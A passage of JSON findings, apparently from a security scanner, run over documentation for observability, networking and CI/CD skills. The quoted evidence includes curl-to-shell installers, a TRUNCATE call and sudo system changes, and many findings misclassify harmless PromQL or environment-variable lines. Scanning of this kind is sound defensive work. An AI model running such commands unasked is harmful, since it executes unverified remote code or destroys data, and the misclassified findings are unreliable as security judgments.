      "severity": "MEDIUM",
      "category": "Path Traversal Risk",
      "file": "skills/observability/dashboard-design.md",
      "line_number": 164,
      "issue": "Path traversal pattern",
      "evidence": "\"expr\": \"sum(rate(http_requests_total{service=\\\"api\\\",status=~\\\"5..\\\"}[5m])) / sum(rate(http_requests_total{service=\\\"api\\\"}[5m])) * 100\",",
      "recommendation": "Validate and sanitize file paths"
    },
    {
      "severity": "MEDIUM",
      "category": "Path Traversal Risk",
      "file": "skills/observability/dashboard-design.md",
      "line_number": 219,
      "issue": "Path traversal pattern",
      "evidence": "\"expr\": \"sum(rate(http_requests_total{status!~\\\"5..\\\"}[30d])) / sum(rate(http_requests_total[30d])) * 100\"",
      "recommendation": "Validate and sanitize file paths"
    },
    {
      "severity": "MEDIUM",
      "category": "Path Traversal Risk",
      "file": "skills/observability/dashboard-design.md",
      "line_number": 247,
      "issue": "Path traversal pattern",
      "evidence": "\"expr\": \"(0.001 - (1 - sum(rate(http_requests_total{status!~\\\"5..\\\"}[30d])) / sum(rate(http_requests_total[30d])))) / 0.001 * 100\"",
      "recommendation": "Validate and sanitize file paths"
    },
    {
      "severity": "MEDIUM",
      "category": "Path Traversal Risk",
      "file": "skills/observability/dashboard-design.md",
      "line_number": 276,
      "issue": "Path traversal pattern",
      "evidence": "\"expr\": \"(sum(rate(http_requests_total{status=~\\\"5..\\\"}[1h])) / sum(rate(http_requests_total[1h]))) / 0.001\",",
      "recommendation": "Validate and sanitize file paths"
    },
    {
      "severity": "MEDIUM",
      "category": "Path Traversal Risk",
      "file": "skills/observability/dashboard-design.md",
      "line_number": 280,
      "issue": "Path traversal pattern",
      "evidence": "\"expr\": \"(sum(rate(http_requests_total{status=~\\\"5..\\\"}[6h])) / sum(rate(http_requests_total[6h]))) / 0.001\",",
      "recommendation": "Validate and sanitize file paths"
    },
    {
      "severity": "MEDIUM",
      "category": "Path Traversal Risk",
      "file": "skills/observability/dashboard-design.md",
      "line_number": 322,
      "issue": "Path traversal pattern",
      "evidence": "\"expr\": \"sum by (endpoint) (rate(http_requests_total{service=\\\"api\\\",status=~\\\"5..\\\"}[5m]))\"",
      "recommendation": "Validate and sanitize file paths"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/observability/opentelemetry-integration.md",
      "line_number": 159,
      "issue": "Unencrypted HTTP",
      "evidence": "endpoint: http://loki:3100/loki/api/v1/push",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/observability/opentelemetry-integration.md",
      "line_number": 225,
      "issue": "Unencrypted HTTP",
      "evidence": "response = requests.get(f'http://auth-service/validate/{user_id}')",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/observability/opentelemetry-integration.md",
      "line_number": 261,
      "issue": "Unencrypted HTTP",
      "evidence": "span_exporter = OTLPSpanExporter(endpoint=\"http://otel-collector:4317\")",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/observability/opentelemetry-integration.md",
      "line_number": 268,
      "issue": "Unencrypted HTTP",
      "evidence": "OTLPMetricExporter(endpoint=\"http://otel-collector:4317\")",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/observability/opentelemetry-integration.md",
      "line_number": 621,
      "issue": "Unencrypted HTTP",
      "evidence": "-Dotel.exporter.otlp.endpoint=http://otel-collector:4317 \\",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/observability/opentelemetry-integration.md",
      "line_number": 642,
      "issue": "Unencrypted HTTP",
      "evidence": "export OTEL_EXPORTER_OTLP_ENDPOINT=http://otel-collector:4318",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/observability/distributed-tracing.md",
      "line_number": 304,
      "issue": "Unencrypted HTTP",
      "evidence": "\"http://service-b/api/data\",",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/observability/distributed-tracing.md",
      "line_number": 536,
      "issue": "Unencrypted HTTP",
      "evidence": "requests.get(\"http://service-b/api/data\")  # Breaks trace!",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/observability/distributed-tracing.md",
      "line_number": 541,
      "issue": "Unencrypted HTTP",
      "evidence": "requests.get(\"http://service-b/api/data\", headers=headers)",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/observability/distributed-tracing/resources/REFERENCE.md",
      "line_number": 1721,
      "issue": "Unencrypted HTTP",
      "evidence": "response = requests.get(\"http://service-b/api\")",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/observability/distributed-tracing/resources/REFERENCE.md",
      "line_number": 1730,
      "issue": "Unencrypted HTTP",
      "evidence": "response = requests.get(\"http://service-b/api\", headers=headers)",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/observability/prometheus-monitoring/resources/REFERENCE.md",
      "line_number": 3073,
      "issue": "Unencrypted HTTP",
      "evidence": "proxy_pass http://prometheus;",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/observability/prometheus-monitoring/resources/REFERENCE.md",
      "line_number": 3087,
      "issue": "Unencrypted HTTP",
      "evidence": "3. URL: `http://prometheus:9090`",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/observability/metrics-instrumentation/resources/REFERENCE.md",
      "line_number": 2340,
      "issue": "Unencrypted HTTP",
      "evidence": "url: http://prometheus:9090",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/observability/metrics-instrumentation/resources/REFERENCE.md",
      "line_number": 2476,
      "issue": "Unencrypted HTTP",
      "evidence": "1. Check target status: `http://prometheus:9090/targets`",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/observability/metrics-instrumentation/resources/REFERENCE.md",
      "line_number": 2477,
      "issue": "Unencrypted HTTP",
      "evidence": "2. Verify metrics endpoint: `curl http://app:8080/metrics`",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Dangerous Command",
      "file": "skills/networking/mosh-resilient-ssh.md",
      "line_number": 24,
      "issue": "Privilege escalation",
      "evidence": "sudo apt install mosh",
      "recommendation": "Document why sudo is needed and alternatives"
    },
    {
      "severity": "MEDIUM",
      "category": "Dangerous Command",
      "file": "skills/networking/mosh-resilient-ssh.md",
      "line_number": 90,
      "issue": "Privilege escalation",
      "evidence": "sudo ufw allow 60000:61000/udp",
      "recommendation": "Document why sudo is needed and alternatives"
    },
    {
      "severity": "MEDIUM",
      "category": "Dangerous Command",
      "file": "skills/networking/mosh-resilient-ssh.md",
      "line_number": 93,
      "issue": "Privilege escalation",
      "evidence": "sudo ufw allow 60001/udp",
      "recommendation": "Document why sudo is needed and alternatives"
    },
    {
      "severity": "CRITICAL",
      "category": "Network Security",
      "file": "skills/networking/tailscale-vpn.md",
      "line_number": 39,
      "issue": "Pipe curl to shell",
      "evidence": "curl -fsSL https://tailscale.com/install.sh | sh",
      "recommendation": "Download, verify, then execute"
    },
    {
      "severity": "MEDIUM",
      "category": "Dangerous Command",
      "file": "skills/networking/tailscale-vpn.md",
      "line_number": 49,
      "issue": "Privilege escalation",
      "evidence": "sudo tailscale up",
      "recommendation": "Document why sudo is needed and alternatives"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/networking/tailscale-vpn.md",
      "line_number": 158,
      "issue": "Unencrypted HTTP",
      "evidence": "response = requests.get(\"http://api-server:8000/data\")",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Dangerous Command",
      "file": "skills/networking/tailscale-vpn.md",
      "line_number": 194,
      "issue": "Privilege escalation",
      "evidence": "echo 'net.ipv4.ip_forward = 1' | sudo tee -a /etc/sysctl.conf",
      "recommendation": "Document why sudo is needed and alternatives"
    },
    {
      "severity": "MEDIUM",
      "category": "Dangerous Command",
      "file": "skills/networking/tailscale-vpn.md",
      "line_number": 195,
      "issue": "Privilege escalation",
      "evidence": "sudo sysctl -p",
      "recommendation": "Document why sudo is needed and alternatives"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/networking/tailscale-vpn.md",
      "line_number": 201,
      "issue": "Unencrypted HTTP",
      "evidence": "curl http://172.17.0.2:8000",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "CRITICAL",
      "category": "Network Security",
      "file": "skills/networking/tailscale-vpn.md",
      "line_number": 281,
      "issue": "Pipe curl to shell",
      "evidence": "RUN curl -fsSL https://tailscale.com/install.sh | sh",
      "recommendation": "Download, verify, then execute"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/networking/tailscale-vpn.md",
      "line_number": 362,
      "issue": "Unencrypted HTTP",
      "evidence": "curl http://dev-server:3000    # React dev server",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/networking/tailscale-vpn.md",
      "line_number": 363,
      "issue": "Unencrypted HTTP",
      "evidence": "curl http://dev-server:8000    # Django backend",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Dangerous Command",
      "file": "skills/engineering/ci-cd-pipelines.md",
      "line_number": 394,
      "issue": "Force flag usage",
      "evidence": "--force-new-deployment",
      "recommendation": "Ensure user understands consequences"
    },
    {
      "severity": "CRITICAL",
      "category": "Network Security",
      "file": "skills/engineering/ci-cd-pipelines.md",
      "line_number": 654,
      "issue": "Pipe curl to shell",
      "evidence": "- curl -sfL https://raw.githubusercontent.com/aquasecurity/trivy/main/contrib/install.sh | sh -s -- -b /usr/local/bin",
      "recommendation": "Download, verify, then execute"
    },
    {
      "severity": "CRITICAL",
      "category": "Network Security",
      "file": "skills/engineering/ci-cd-pipelines.md",
      "line_number": 664,
      "issue": "Pipe curl to shell",
      "evidence": "- curl -sSfL https://raw.githubusercontent.com/anchore/syft/main/install.sh | sh -s -- -b /usr/local/bin",
      "recommendation": "Download, verify, then execute"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/engineering/ci-cd-pipelines.md",
      "line_number": 773,
      "issue": "Unencrypted HTTP",
      "evidence": "- kubectl run curl-test --image=curlimages/curl --rm -it --restart=Never -- curl -f http://myapp-$NEW_COLOR.prod.svc.cluster.local/health",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/engineering/ci-cd-pipelines.md",
      "line_number": 1021,
      "issue": "Unencrypted HTTP",
      "evidence": "ERROR_RATE=\\$(curl -s http://prometheus:9090/api/v1/query?query=rate(http_requests_total{status=~\"5..\"}[5m]) | jq -r '.data.result[0].value[1]')",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/engineering/deployment-strategies.md",
      "line_number": 189,
      "issue": "Unencrypted HTTP",
      "evidence": "curl http://myapp-green-preview/health",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Path Traversal Risk",
      "file": "skills/engineering/test-driven-development.md",
      "line_number": 796,
      "issue": "Path traversal pattern",
      "evidence": "--source-dir ../../../src \\",
      "recommendation": "Validate and sanitize file paths"
    },
    {
      "severity": "MEDIUM",
      "category": "Path Traversal Risk",
      "file": "skills/engineering/test-driven-development.md",
      "line_number": 797,
      "issue": "Path traversal pattern",
      "evidence": "--test-dir ../../../tests \\",
      "recommendation": "Validate and sanitize file paths"
    },
    {
      "severity": "MEDIUM",
      "category": "Path Traversal Risk",
      "file": "skills/engineering/test-driven-development.md",
      "line_number": 798,
      "issue": "Path traversal pattern",
      "evidence": "--coverage-file ../../../.coverage",
      "recommendation": "Validate and sanitize file paths"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/engineering/monitoring-alerts.md",
      "line_number": 281,
      "issue": "Unencrypted HTTP",
      "evidence": "curl 'http://prometheus:9090/api/v1/query?query=...'",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/engineering/monitoring-alerts.md",
      "line_number": 390,
      "issue": "Unencrypted HTTP",
      "evidence": "\"http://alertmanager:9093/api/v1/alerts\",",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Path Traversal Risk",
      "file": "skills/engineering/incident-response/resources/REFERENCE.md",
      "line_number": 1376,
      "issue": "Path traversal pattern",
      "evidence": "- Dashboard: https://grafana.../payments",
      "recommendation": "Validate and sanitize file paths"
    },
    {
      "severity": "MEDIUM",
      "category": "Path Traversal Risk",
      "file": "skills/engineering/incident-response/resources/REFERENCE.md",
      "line_number": 2245,
      "issue": "Path traversal pattern",
      "evidence": "- Dashboard: https://grafana.../redis",
      "recommendation": "Validate and sanitize file paths"
    },
    {
      "severity": "MEDIUM",
      "category": "Path Traversal Risk",
      "file": "skills/engineering/incident-response/resources/REFERENCE.md",
      "line_number": 2251,
      "issue": "Path traversal pattern",
      "evidence": "- Runbook: https://docs.../db-upgrade",
      "recommendation": "Validate and sanitize file paths"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/engineering/incident-response/resources/examples/runbooks/database-connection-pool-exhausted.md",
      "line_number": 69,
      "issue": "Unencrypted HTTP",
      "evidence": "curl http://api.example.com:9090/metrics | grep -E 'connection_pool_(active|idle|max)'",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/engineering/incident-response/resources/examples/runbooks/database-connection-pool-exhausted.md",
      "line_number": 134,
      "issue": "Unencrypted HTTP",
      "evidence": "curl http://api.example.com:9090/metrics | \\",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/engineering/incident-response/resources/examples/runbooks/database-connection-pool-exhausted.md",
      "line_number": 142,
      "issue": "Unencrypted HTTP",
      "evidence": "curl \"http://prometheus:9090/api/v1/query?query=rate(http_requests_total[5m])\"",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/engineering/incident-response/resources/examples/runbooks/database-connection-pool-exhausted.md",
      "line_number": 145,
      "issue": "Unencrypted HTTP",
      "evidence": "curl \"http://prometheus:9090/api/v1/query?query=rate(database_query_duration_seconds_sum[5m])\"",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/engineering/incident-response/resources/examples/runbooks/database-connection-pool-exhausted.md",
      "line_number": 148,
      "issue": "Unencrypted HTTP",
      "evidence": "curl http://api.example.com:9090/metrics | \\",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/engineering/incident-response/resources/examples/runbooks/database-connection-pool-exhausted.md",
      "line_number": 208,
      "issue": "Unencrypted HTTP",
      "evidence": "watch 'curl -s http://api.example.com:9090/metrics | grep connection_pool_active'",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/engineering/incident-response/resources/examples/runbooks/database-connection-pool-exhausted.md",
      "line_number": 237,
      "issue": "Unencrypted HTTP",
      "evidence": "curl http://api.example.com:9090/metrics | grep connection_pool",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Path Traversal Risk",
      "file": "skills/engineering/incident-response/resources/examples/runbooks/database-connection-pool-exhausted.md",
      "line_number": 410,
      "issue": "Path traversal pattern",
      "evidence": "- [2025-09-15: Connection Pool Exhaustion](../postmortems/2025-09-15-connection-pool.md)",
      "recommendation": "Validate and sanitize file paths"
    },
    {
      "severity": "MEDIUM",
      "category": "Path Traversal Risk",
      "file": "skills/engineering/incident-response/resources/examples/runbooks/database-connection-pool-exhausted.md",
      "line_number": 411,
      "issue": "Path traversal pattern",
      "evidence": "- [2025-06-22: Slow Query Impact](../postmortems/2025-06-22-slow-query.md)",
      "recommendation": "Validate and sanitize file paths"
    },
    {
      "severity": "MEDIUM",
      "category": "Path Traversal Risk",
      "file": "skills/engineering/incident-response/resources/examples/runbooks/database-connection-pool-exhausted.md",
      "line_number": 414,
      "issue": "Path traversal pattern",
      "evidence": "- [Database Connection Settings](../docs/database-config.md)",
      "recommendation": "Validate and sanitize file paths"
    },
    {
      "severity": "MEDIUM",
      "category": "Path Traversal Risk",
      "file": "skills/engineering/incident-response/resources/examples/runbooks/database-connection-pool-exhausted.md",
      "line_number": 415,
      "issue": "Path traversal pattern",
      "evidence": "- [Pool Sizing Guidelines](../docs/pool-sizing.md)",
      "recommendation": "Validate and sanitize file paths"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/engineering/incident-response/resources/examples/runbooks/database-connection-pool-exhausted.md",
      "line_number": 453,
      "issue": "Unencrypted HTTP",
      "evidence": "curl http://api:9090/metrics | grep connection_pool",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/engineering/resources/feature-flags/REFERENCE.md",
      "line_number": 391,
      "issue": "Unencrypted HTTP",
      "evidence": "url=\"http://unleash.example.com\",",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Dangerous Command",
      "file": "skills/engineering/deployment-strategies/resources/REFERENCE.md",
      "line_number": 129,
      "issue": "Force flag usage",
      "evidence": "--force-new-deployment",
      "recommendation": "Ensure user understands consequences"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/engineering/deployment-strategies/resources/REFERENCE.md",
      "line_number": 285,
      "issue": "Unencrypted HTTP",
      "evidence": "curl -f http://$GREEN_IP/health || {",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/engineering/deployment-strategies/resources/REFERENCE.md",
      "line_number": 510,
      "issue": "Unencrypted HTTP",
      "evidence": "url: http://flagger-loadtester/",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/engineering/deployment-strategies/resources/REFERENCE.md",
      "line_number": 514,
      "issue": "Unencrypted HTTP",
      "evidence": "cmd: \"hey -z 1m -q 10 -c 2 http://myapp-canary/\"",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/engineering/deployment-strategies/resources/REFERENCE.md",
      "line_number": 527,
      "issue": "Unencrypted HTTP",
      "evidence": "address: http://prometheus:9090",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Dangerous Command",
      "file": "skills/engineering/deployment-strategies/resources/REFERENCE.md",
      "line_number": 971,
      "issue": "Force flag usage",
      "evidence": "--force-new-deployment",
      "recommendation": "Ensure user understands consequences"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/engineering/deployment-strategies/resources/REFERENCE.md",
      "line_number": 993,
      "issue": "Unencrypted HTTP",
      "evidence": "url: \"http://lb.example.com/api/pool/remove\"",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/engineering/deployment-strategies/resources/REFERENCE.md",
      "line_number": 1029,
      "issue": "Unencrypted HTTP",
      "evidence": "url: \"http://{{ inventory_hostname }}:8080/health\"",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/engineering/deployment-strategies/resources/REFERENCE.md",
      "line_number": 1038,
      "issue": "Unencrypted HTTP",
      "evidence": "url: \"http://lb.example.com/api/pool/add\"",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/engineering/deployment-strategies/resources/REFERENCE.md",
      "line_number": 1579,
      "issue": "Unencrypted HTTP",
      "evidence": "ERROR_RATE=$(curl -s \"http://prometheus:9090/api/v1/query\" \\",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Path Traversal Risk",
      "file": "skills/engineering/deployment-strategies/resources/REFERENCE.md",
      "line_number": 1580,
      "issue": "Path traversal pattern",
      "evidence": "--data-urlencode \"query=sum(rate(http_requests_total{status=~\\\"5..\\\",deployment=\\\"$DEPLOYMENT\\\"}[5m]))/sum(rate(http_requests_total{deployment=\\\"$DEPLOYMENT\\\"}[5m]))*100\" \\",
      "recommendation": "Validate and sanitize file paths"
    },
    {
      "severity": "HIGH",
      "category": "Dangerous Command",
      "file": "skills/engineering/deployment-strategies/resources/REFERENCE.md",
      "line_number": 1668,
      "issue": "Destructive database operation",
      "evidence": "db.execute(\"TRUNCATE user_preferences\")",
      "recommendation": "Require backup and confirmation"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/engineering/deployment-strategies/resources/REFERENCE.md",
      "line_number": 1767,
      "issue": "Unencrypted HTTP",
      "evidence": "proxy_pass http://app;",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/engineering/deployment-strategies/resources/REFERENCE.md",
      "line_number": 2092,
      "issue": "Unencrypted HTTP",
      "evidence": "address: http://prometheus:9090",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Path Traversal Risk",
      "file": "skills/engineering/deployment-strategies/resources/REFERENCE.md",
      "line_number": 2495,
      "issue": "Path traversal pattern",
      "evidence": "\"expr\": \"sum(rate(http_requests_total{status=~\\\"5..\\\"}[5m])) by (version) / sum(rate(http_requests_total[5m])) by (version) * 100\"",
      "recommendation": "Validate and sanitize file paths"
    },
    {
      "severity": "MEDIUM",
      "category": "Path Traversal Risk",
      "file": "skills/engineering/deployment-strategies/resources/examples/README.md",
      "line_number": 237,
      "issue": "Path traversal pattern",
      "evidence": "../scripts/validate_deployment.py --file kubernetes-blue-green.yaml",
      "recommendation": "Validate and sanitize file paths"
    },
    {
      "severity": "MEDIUM",
      "category": "Path Traversal Risk",
      "file": "skills/engineering/deployment-strategies/resources/examples/README.md",
      "line_number": 240,
      "issue": "Path traversal pattern",
      "evidence": "../scripts/test_deployment.sh --url http://localhost --duration 300",
      "recommendation": "Validate and sanitize file paths"
    },
    {
      "severity": "MEDIUM",
      "category": "Path Traversal Risk",
      "file": "skills/engineering/deployment-strategies/resources/examples/README.md",
      "line_number": 243,
      "issue": "Path traversal pattern",
      "evidence": "../scripts/execute_canary.py --platform kubernetes --service myapp --version v2.0",
      "recommendation": "Validate and sanitize file paths"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/engineering/deployment-strategies/resources/examples/README.md",
      "line_number": 302,
      "issue": "Unencrypted HTTP",
      "evidence": "curl \"http://prometheus:9090/api/v1/query?query=http_requests_total\"",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Path Traversal Risk",
      "file": "skills/engineering/deployment-strategies/resources/examples/README.md",
      "line_number": 360,
      "issue": "Path traversal pattern",
      "evidence": "- [Main REFERENCE.md](../REFERENCE.md) - Comprehensive deployment strategies guide",
      "recommendation": "Validate and sanitize file paths"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/engineering/monitoring-alerts/resources/REFERENCE.md",
      "line_number": 1562,
      "issue": "Unencrypted HTTP",
      "evidence": "\"http://alertmanager:9093/api/v1/alerts\",",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/engineering/monitoring-alerts/resources/REFERENCE.md",
      "line_number": 1584,
      "issue": "Unencrypted HTTP",
      "evidence": "curl -X POST http://pushgateway:9091/metrics/job/test -d '",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/engineering/monitoring-alerts/resources/REFERENCE.md",
      "line_number": 1592,
      "issue": "Unencrypted HTTP",
      "evidence": "curl http://alertmanager:9093/api/v1/alerts | jq '.data[] | select(.labels.alertname==\"TestAlert\")'",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/engineering/monitoring-alerts/resources/REFERENCE.md",
      "line_number": 1744,
      "issue": "Unencrypted HTTP",
      "evidence": "curl 'http://prometheus:9090/api/v1/query?query=my_metric'",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/engineering/monitoring-alerts/resources/REFERENCE.md",
      "line_number": 1747,
      "issue": "Unencrypted HTTP",
      "evidence": "curl http://prometheus:9090/api/v1/rules | jq '.data.groups[].rules[] | select(.name==\"MyAlert\")'",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/engineering/monitoring-alerts/resources/REFERENCE.md",
      "line_number": 1750,
      "issue": "Unencrypted HTTP",
      "evidence": "curl http://prometheus:9090/api/v1/alerts | jq '.data.alerts[] | select(.labels.alertname==\"MyAlert\")'",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/engineering/monitoring-alerts/resources/REFERENCE.md",
      "line_number": 1753,
      "issue": "Unencrypted HTTP",
      "evidence": "promtool query instant http://prometheus:9090 'my_metric > 100'",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/engineering/monitoring-alerts/resources/REFERENCE.md",
      "line_number": 1769,
      "issue": "Unencrypted HTTP",
      "evidence": "curl http://prometheus:9090/api/v1/targets | jq '.data.activeTargets[] | select(.job==\"alertmanager\")'",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/engineering/monitoring-alerts/resources/REFERENCE.md",
      "line_number": 1787,
      "issue": "Unencrypted HTTP",
      "evidence": "curl http://alertmanager:9093/api/v1/alerts",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/engineering/monitoring-alerts/resources/REFERENCE.md",
      "line_number": 1790,
      "issue": "Unencrypted HTTP",
      "evidence": "curl http://alertmanager:9093/metrics | grep notification",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "HIGH",
      "category": "Hardcoded Secret",
      "file": "skills/engineering/monitoring-alerts/resources/REFERENCE.md",
      "line_number": 2017,
      "issue": "Possible hardcoded password",
      "evidence": "auth_password: '${SMTP_PASSWORD}'  # Environment variable - set securely before running",
      "recommendation": "Use environment variables or secret management"
    },
    {
      "severity": "MEDIUM",
      "category": "Dangerous Command",
      "file": "skills/engineering/monitoring-alerts/resources/examples/runbooks/high-memory-usage.md",
      "line_number": 128,
      "issue": "Privilege escalation",
      "evidence": "sudo slabtop",
      "recommendation": "Document why sudo is needed and alternatives"
    },
    {
      "severity": "MEDIUM",
      "category": "Dangerous Command",
      "file": "skills/engineering/monitoring-alerts/resources/examples/runbooks/high-memory-usage.md",
      "line_number": 135,
      "issue": "Privilege escalation",
      "evidence": "sudo journalctl -xe | grep -i oom",
      "recommendation": "Document why sudo is needed and alternatives"
    },
    {
      "severity": "MEDIUM",
      "category": "Dangerous Command",
      "file": "skills/engineering/monitoring-alerts/resources/examples/runbooks/high-memory-usage.md",
      "line_number": 198,
      "issue": "Privilege escalation",
      "evidence": "sudo systemctl restart [service]",
      "recommendation": "Document why sudo is needed and alternatives"
    },
    {
      "severity": "MEDIUM",
      "category": "Dangerous Command",
      "file": "skills/engineering/monitoring-alerts/resources/examples/runbooks/high-memory-usage.md",
      "line_number": 251,
      "issue": "Privilege escalation",
      "evidence": "sudo fallocate -l 4G /swapfile",
      "recommendation": "Document why sudo is needed and alternatives"
    },
    {
      "severity": "MEDIUM",
      "category": "Dangerous Command",
      "file": "skills/engineering/monitoring-alerts/resources/examples/runbooks/high-memory-usage.md",
      "line_number": 252,
      "issue": "Privilege escalation",
      "evidence": "sudo chmod 600 /swapfile",
      "recommendation": "Document why sudo is needed and alternatives"
    },
    {
      "severity": "MEDIUM",
      "category": "Dangerous Command",
      "file": "skills/engineering/monitoring-alerts/resources/examples/runbooks/high-memory-usage.md",
      "line_number": 253,
      "issue": "Privilege escalation",
      "evidence": "sudo mkswap /swapfile",
      "recommendation": "Document why sudo is needed and alternatives"
    },
    {
      "severity": "MEDIUM",
      "category": "Dangerous Command",
      "file": "skills/engineering/monitoring-alerts/resources/examples/runbooks/high-memory-usage.md",
      "line_number": 254,
      "issue": "Privilege escalation",
      "evidence": "sudo swapon /swapfile",
      "recommendation": "Document why sudo is needed and alternatives"
    },
    {
      "severity": "MEDIUM",
      "category": "Dangerous Command",
      "file": "skills/engineering/monitoring-alerts/resources/examples/runbooks/high-memory-usage.md",
      "line_number": 316,
      "issue": "Privilege escalation",
      "evidence": "sudo swapoff /swapfile",
